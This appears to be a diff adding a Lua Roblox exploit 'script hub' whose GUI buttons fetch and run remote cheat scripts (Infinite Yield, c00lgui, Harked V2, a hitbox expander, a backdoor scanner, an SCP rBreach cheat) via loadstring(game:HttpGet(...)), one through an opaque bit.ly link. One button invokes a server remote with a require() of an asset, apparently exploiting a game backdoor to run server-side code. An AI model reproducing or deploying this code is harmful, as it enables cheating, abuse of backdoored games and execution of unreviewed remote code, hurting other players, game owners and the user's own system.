@@ -1,0 +1,452 @@
+local revivedgui = Instance.new("ScreenGui")
+local Gui = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+local speedgui = Instance.new("TextButton")
+local c00lgui = Instance.new("TextButton")
+local iy = Instance.new("TextButton")
+local scanbackdor = Instance.new("TextButton")
+local etroll = Instance.new("TextButton")
+local lyn = Instance.new("TextButton")
+local harkedv2 = Instance.new("TextButton")
+local hitboxexp = Instance.new("TextButton")
+local musicplayer = Instance.new("TextButton")
+local QUEEN = Instance.new("TextButton")
+local Frame = Instance.new("Frame")
+local OpenButton = Instance.new("TextButton")
+
+--Properties:
+
+revivedgui.Name = "revivedgui"
+revivedgui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+revivedgui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Gui.Name = "Gui"
+Gui.Parent = revivedgui
+Gui.BackgroundColor3 = Color3.fromRGB(255, 189, 190)
+Gui.Position = UDim2.new(0.258849561, 0, 0.180027187, 0)
+Gui.Size = UDim2.new(0, 419, 0, 339)
+Gui.Visible = false
+
+TextLabel.Parent = Gui
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.Position = UDim2.new(0.0143198092, 0, 0, 0)
+TextLabel.Size = UDim2.new(0, 413, 0, 50)
+TextLabel.Font = Enum.Font.GothamBold
+TextLabel.Text = "SCRIPT HUB V1"
+TextLabel.TextColor3 = Color3.fromRGB(53, 3, 255)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14.000
+TextLabel.TextWrapped = true
+
+speedgui.Name = "speed gui"
+speedgui.Parent = Gui
+speedgui.BackgroundColor3 = Color3.fromRGB(138, 139, 152)
+speedgui.Position = UDim2.new(0.0143198092, 0, 0.187349975, 0)
+speedgui.Size = UDim2.new(0, 86, 0, 50)
+speedgui.Font = Enum.Font.GothamBold
+speedgui.Text = "Change Speed Gui"
+speedgui.TextColor3 = Color3.fromRGB(255, 0, 0)
+speedgui.TextScaled = true
+speedgui.TextSize = 14.000
+speedgui.TextWrapped = true
+
+c00lgui.Name = "c00lgui"
+c00lgui.Parent = Gui
+c00lgui.BackgroundColor3 = Color3.fromRGB(138, 139, 152)
+c00lgui.Position = UDim2.new(0.236276835, 0, 0.187349975, 0)
+c00lgui.Size = UDim2.new(0, 95, 0, 50)
+c00lgui.Font = Enum.Font.GothamBold
+c00lgui.Text = "c00lgui FE"
+c00lgui.TextColor3 = Color3.fromRGB(255, 0, 0)
+c00lgui.TextScaled = true
+c00lgui.TextSize = 14.000
+c00lgui.TextWrapped = true
+
+iy.Name = "iy"
+iy.Parent = Gui
+iy.BackgroundColor3 = Color3.fromRGB(138, 139, 152)
+iy.Position = UDim2.new(0.484486848, 0, 0.187349975, 0)
+iy.Size = UDim2.new(0, 95, 0, 50)
+iy.Font = Enum.Font.GothamBold
+iy.Text = "Infinite Yield FE"
+iy.TextColor3 = Color3.fromRGB(255, 0, 0)
+iy.TextScaled = true
+iy.TextSize = 14.000
+iy.TextWrapped = true
+
+scanbackdor.Name = "scan back dor"
+scanbackdor.Parent = Gui
+scanbackdor.BackgroundColor3 = Color3.fromRGB(138, 139, 152)
+scanbackdor.Position = UDim2.new(0.744630098, 0, 0.187349975, 0)
+scanbackdor.Size = UDim2.new(0, 99, 0, 50)
+scanbackdor.Font = Enum.Font.GothamBold
+scanbackdor.Text = "Calamaty Backdoor Scanner"
+scanbackdor.TextColor3 = Color3.fromRGB(255, 0, 0)
+scanbackdor.TextScaled = true
+scanbackdor.TextSize = 14.000
+scanbackdor.TextWrapped = true
+
+etroll.Name = "e troll"
+etroll.Parent = Gui
+etroll.BackgroundColor3 = Color3.fromRGB(138, 139, 152)
+etroll.Size = UDim2.new(0, 35, 0, 50)
+etroll.Font = Enum.Font.GothamBold
+etroll.Text = "TROLL"
+etroll.TextColor3 = Color3.fromRGB(255, 0, 0)
+etroll.TextScaled = true
+etroll.TextSize = 14.000
+etroll.TextWrapped = true
+
+lyn.Name = "lyn"
+lyn.Parent = Gui
+lyn.BackgroundColor3 = Color3.fromRGB(138, 139, 152)
+lyn.Position = UDim2.new(0.23627685, 0, 0.361391276, 0)
+lyn.Size = UDim2.new(0, 95, 0, 50)
+lyn.Font = Enum.Font.GothamBold
+lyn.Text = "rBreach Gui"
+lyn.TextColor3 = Color3.fromRGB(255, 0, 0)
+lyn.TextScaled = true
+lyn.TextSize = 14.000
+lyn.TextWrapped = true
+
+harkedv2.Name = "harked v2"
+harkedv2.Parent = Gui
+harkedv2.BackgroundColor3 = Color3.fromRGB(138, 139, 152)
+harkedv2.Position = UDim2.new(0.484486878, 0, 0.361391276, 0)
+harkedv2.Size = UDim2.new(0, 95, 0, 50)
+harkedv2.Font = Enum.Font.GothamBold
+harkedv2.Text = "Harked V2"
+harkedv2.TextColor3 = Color3.fromRGB(255, 0, 0)
+harkedv2.TextScaled = true
+harkedv2.TextSize = 14.000
+harkedv2.TextWrapped = true
+
+hitboxexp.Name = "hitbox exp"
+hitboxexp.Parent = Gui
+hitboxexp.BackgroundColor3 = Color3.fromRGB(138, 139, 152)
+hitboxexp.Position = UDim2.new(0.0143198092, 0, 0.361391306, 0)
+hitboxexp.Size = UDim2.new(0, 87, 0, 50)
+hitboxexp.Font = Enum.Font.GothamBold
+hitboxexp.Text = "Hitbox Expander"
+hitboxexp.TextColor3 = Color3.fromRGB(255, 0, 0)
+hitboxexp.TextScaled = true
+hitboxexp.TextSize = 14.000
+hitboxexp.TextWrapped = true
+
+musicplayer.Name = "music player"
+musicplayer.Parent = Gui
+musicplayer.BackgroundColor3 = Color3.fromRGB(138, 139, 152)
+musicplayer.Position = UDim2.new(0.744630098, 0, 0.361391276, 0)
+musicplayer.Size = UDim2.new(0, 99, 0, 50)
+musicplayer.Font = Enum.Font.GothamBold
+musicplayer.Text = "Music Player (NOT FINISHED)"
+musicplayer.TextColor3 = Color3.fromRGB(255, 0, 0)
+musicplayer.TextScaled = true
+musicplayer.TextSize = 14.000
+musicplayer.TextWrapped = true
+
+QUEEN.Name = "QUEEN"
+QUEEN.Parent = Gui
+QUEEN.BackgroundColor3 = Color3.fromRGB(138, 139, 152)
+QUEEN.Position = UDim2.new(0.205250591, 0, 0.674075663, 0)
+QUEEN.Size = UDim2.new(0, 253, 0, 50)
+QUEEN.Font = Enum.Font.GothamBold
+QUEEN.Text = "Queen Foots Battles Amogus hub v3"
+QUEEN.TextColor3 = Color3.fromRGB(255, 0, 0)
+QUEEN.TextScaled = true
+QUEEN.TextSize = 14.000
+QUEEN.TextWrapped = true
+
+Frame.Parent = revivedgui
+Frame.BackgroundColor3 = Color3.fromRGB(171, 190, 189)
+Frame.Position = UDim2.new(0.0309734512, 0, 0.713315189, 0)
+Frame.Size = UDim2.new(0, 100, 0, 132)
+
+OpenButton.Name = "OpenButton"
+OpenButton.Parent = Frame
+OpenButton.BackgroundColor3 = Color3.fromRGB(144, 220, 255)
+OpenButton.Position = UDim2.new(0, 0, 0.416358948, 0)
+OpenButton.Size = UDim2.new(0, 100, 0, 77)
+OpenButton.Font = Enum.Font.GothamBold
+OpenButton.Text = "Open/Close Gui"
+OpenButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+OpenButton.TextScaled = true
+OpenButton.TextSize = 14.000
+OpenButton.TextWrapped = true
+
+-- Scripts:
+
+local function HVGCXNT_fake_script() -- Gui.Dragify 
+	local script = Instance.new('LocalScript', Gui)
+
+	local UIS = game:GetService("UserInputService")
+	function dragify(Frame)
+	    dragToggle = nil
+	    local dragSpeed = 0.50
+	    dragInput = nil
+	    dragStart = nil
+	    local dragPos = nil
+	    function updateInput(input)
+	        local Delta = input.Position - dragStart
+	        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
+	        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.30), {Position = Position}):Play()
+	    end
+	    Frame.InputBegan:Connect(function(input)
+	        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
+	            dragToggle = true
+	            dragStart = input.Position
+	            startPos = Frame.Position
+	            input.Changed:Connect(function()
+	                if input.UserInputState == Enum.UserInputState.End then
+	                    dragToggle = false
+	                end
+	            end)
+	        end
+	    end)
+	    Frame.InputChanged:Connect(function(input)
+	        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+	            dragInput = input
+	        end
+	    end)
+	    game:GetService("UserInputService").InputChanged:Connect(function(input)
+	        if input == dragInput and dragToggle then
+	            updateInput(input)
+	        end
+	    end)
+	end
+	
+	dragify(script.Parent)
+end
+coroutine.wrap(HVGCXNT_fake_script)()
+local function AAKLYFE_fake_script() -- TextLabel.LocalScript 
+	local script = Instance.new('LocalScript', TextLabel)
+
+	while true do
+		script.Parent.BackgroundColor3 = Color3.new (1, 0, 0.0156863)
+		wait(.1)
+		script.Parent.BackgroundColor3 = Color3.new (1, 0, 0.4)
+		wait(.1)
+		script.Parent.BackgroundColor3 = Color3.new (1, 0, 0.533333)
+		wait(.1)
+		script.Parent.BackgroundColor3 = Color3.new (1, 0, 0.917647)
+		wait(.1)
+		script.Parent.BackgroundColor3 = Color3.new (0.933333, 0, 1)
+		wait(.1)
+		script.Parent.BackgroundColor3 = Color3.new (0.701961, 0, 1)
+		wait(.1)
+		script.Parent.BackgroundColor3 = Color3.new (0.584314, 0, 1)
+		wait(.1)
+		script.Parent.BackgroundColor3 = Color3.new (0.380392, 0.0235294, 1)
+		wait(.1)
+		script.Parent.BackgroundColor3 = Color3.new (0.0235294, 0.0235294, 1)
+		wait(.1)
+		script.Parent.BackgroundColor3 = Color3.new (0.0117647, 0.388235, 1)
+		wait(.1)
+		script.Parent.BackgroundColor3 = Color3.new (0, 0.533333, 1)
+		wait(.1)
+		script.Parent.BackgroundColor3 = Color3.new (0, 0.65098, 1)
+		wait(.1)
+		script.Parent.BackgroundColor3 = Color3.new (0, 0.819608, 1)
+		wait(.1)
+		script.Parent.BackgroundColor3 = Color3.new (0, 1, 1)
+		wait(.1)
+		script.Parent.BackgroundColor3 = Color3.new (0, 1, 0.74902)
+		wait(.1)
+		script.Parent.BackgroundColor3 = Color3.new (0, 1, 0.54902)
+		wait(.1)
+		script.Parent.BackgroundColor3 = Color3.new (0, 1, 0.415686)
+		wait(.1)
+		script.Parent.BackgroundColor3 = Color3.new (0.317647, 1, 0)
+		wait(.1)
+		script.Parent.BackgroundColor3 = Color3.new (0.6, 1, 0)
+		wait(.1)
+		script.Parent.BackgroundColor3 = Color3.new (0.682353, 1, 0)
+		wait(.1)
+		script.Parent.BackgroundColor3 = Color3.new (0.984314, 1, 0)
+		wait(.1)
+		script.Parent.BackgroundColor3 = Color3.new (1, 0.886275, 0)
+		wait(.1)
+		script.Parent.BackgroundColor3 = Color3.new (1, 0.8, 0)
+		wait(.1)
+		script.Parent.BackgroundColor3 = Color3.new (1, 0.615686, 0)
+		wait(.1)
+		script.Parent.BackgroundColor3 = Color3.new (1, 0.533333, 0)
+		wait(.1)
+		script.Parent.BackgroundColor3 = Color3.new (1, 0.333333, 0)
+		wait(.1)
+		script.Parent.BackgroundColor3 = Color3.new (1, 0.333333, 0)
+		wait(.1)
+		script.Parent.BackgroundColor3 = Color3.new (1, 0, 0)
+		wait(.1)
+	end
+end
+coroutine.wrap(AAKLYFE_fake_script)()
+local function FBAO_fake_script() -- speedgui.LocalScript 
+	local script = Instance.new('LocalScript', speedgui)
+
+	script.Parent.MouseButton1Click:Connect(function()
+	
+		local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+		getgenv().Theme = "DarkTheme"
+	--[[
+	    LightTheme
+	    DarkTheme
+	    GrapeTheme
+	    BloodTheme
+	    Ocean
+	    Midnight
+	    Sentinel
+	    Synapse
+	]]
+		local Window = Library.CreateLib("Walkspeed GUI", getgenv().Theme)
+		local Tab = Window:NewTab("LocalPlayer")
+		local Section = Tab:NewSection("Speed")
+		Section:NewTextBox("Character speed", "Type in a number to make the speed u want", function(txt)
+			game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = txt
+		end)
+		Section:NewKeybind("Toggle ui", "makes the gui invisible, press again to make it visible", Enum.KeyCode.RightAlt, function()
+			Library:ToggleUI()
+		end)
+	end)
+end
+coroutine.wrap(FBAO_fake_script)()
+local function XRJFVW_fake_script() -- c00lgui.LocalScript 
+	local script = Instance.new('LocalScript', c00lgui)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:GetObjects("rbxassetid://8127297852")[1].Source)()
+	end)
+end
+coroutine.wrap(XRJFVW_fake_script)()
+local function MZWLQYS_fake_script() -- iy.LocalScript 
+	local script = Instance.new('LocalScript', iy)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+	end)
+end
+coroutine.wrap(MZWLQYS_fake_script)()
+local function OOQLFTK_fake_script() -- scanbackdor.LocalScript 
+	local script = Instance.new('LocalScript', scanbackdor)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet(('https://raw.githubusercontent.com/TheRevivedGuy/roblox-scripting/main/cm%20scan'),true))()
+	end)
+end
+coroutine.wrap(OOQLFTK_fake_script)()
+local function SNVY_fake_script() -- etroll.LocalScript 
+	local script = Instance.new('LocalScript', etroll)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet('https://bit.ly/3TcD7sQ'))()
+	end)
+end
+coroutine.wrap(SNVY_fake_script)()
+local function VLATAR_fake_script() -- lyn.LocalScript 
+	local script = Instance.new('LocalScript', lyn)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/LynXzl/Scripts/main/SCP%20rBreach/Script.lua"))()
+	end)
+end
+coroutine.wrap(VLATAR_fake_script)()
+local function QTVQUF_fake_script() -- harkedv2.LocalScript 
+	local script = Instance.new('LocalScript', harkedv2)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/TheRevivedGuy/roblox-scripting/main/harked%20v2%20edit"))()
+	end)
+end
+coroutine.wrap(QTVQUF_fake_script)()
+local function XTWYC_fake_script() -- hitboxexp.LocalScript 
+	local script = Instance.new('LocalScript', hitboxexp)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/RectangularObject/Roblox-Hitbox-Expander/main/HitboxExtenderv2.lua",true))()
+	end)
+end
+coroutine.wrap(XTWYC_fake_script)()
+local function JIYTHIV_fake_script() -- musicplayer.LocalScript 
+	local script = Instance.new('LocalScript', musicplayer)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/TheRevivedGuy/roblox-scripting/main/music%20player"))()
+	end)
+end
+coroutine.wrap(JIYTHIV_fake_script)()
+local function KHIL_fake_script() -- QUEEN.LocalScript 
+	local script = Instance.new('LocalScript', QUEEN)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		game.ReplicatedStorage.lmao:InvokeServer([[require(12142068255).load(]]..'"'..game:GetService("Players").LocalPlayer.Name..'"'..[[)]])
+			end)
+end
+coroutine.wrap(KHIL_fake_script)()
+local function HTYSMC_fake_script() -- revivedgui.Notify 
+	local script = Instance.new('LocalScript', revivedgui)
+
+	game:GetService("StarterGui"):SetCore("SendNotification", {
+		Title = "Information";
+		Text = "Thanks for using my hub";
+		Duration = 10;
+	})
+	
+end
+coroutine.wrap(HTYSMC_fake_script)()
+local function EREND_fake_script() -- OpenButton.LocalScript 
+	local script = Instance.new('LocalScript', OpenButton)
+
+	local frame = script.Parent.Parent.Parent.Gui
+	local open = false
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		if frame.Visible == false then
+			frame.Visible = true
+		else
+			frame.Visible = false
+		end
+	end)
+end
+coroutine.wrap(EREND_fake_script)()
+local function VDXA_fake_script() -- Frame.Dragify 
+	local script = Instance.new('LocalScript', Frame)
+
+	local UIS = game:GetService("UserInputService")
+	function dragify(Frame)
+	    dragToggle = nil
+	    local dragSpeed = 0.50
+	    dragInput = nil
+	    dragStart = nil
+	    local dragPos = nil
+	    function updateInput(input)
+	        local Delta = input.Position - dragStart
+	        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
+	        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.30), {Position = Position}):Play()
+	    end
+	    Frame.InputBegan:Connect(function(input)
+	        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
+	            dragToggle = true
+	            dragStart = input.Position
+	            startPos = Frame.Position
+	            input.Changed:Connect(function()
+	                if input.UserInputState == Enum.UserInputState.End then
+	                    dragToggle = false
+	                end
+	            end)
+	        end
+	    end)
+	    Frame.InputChanged:Connect(function(input)
+	        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+	            dragInput = input
+	        end
+	    end)
+	    game:GetService("UserInputService").InputChanged:Connect(function(input)
+	        if input == dragInput and dragToggle then
+	            updateInput(input)
+	        end
+	    end)
+	end
+	
+	dragify(script.Parent)
+end
+coroutine.wrap(VDXA_fake_script)()
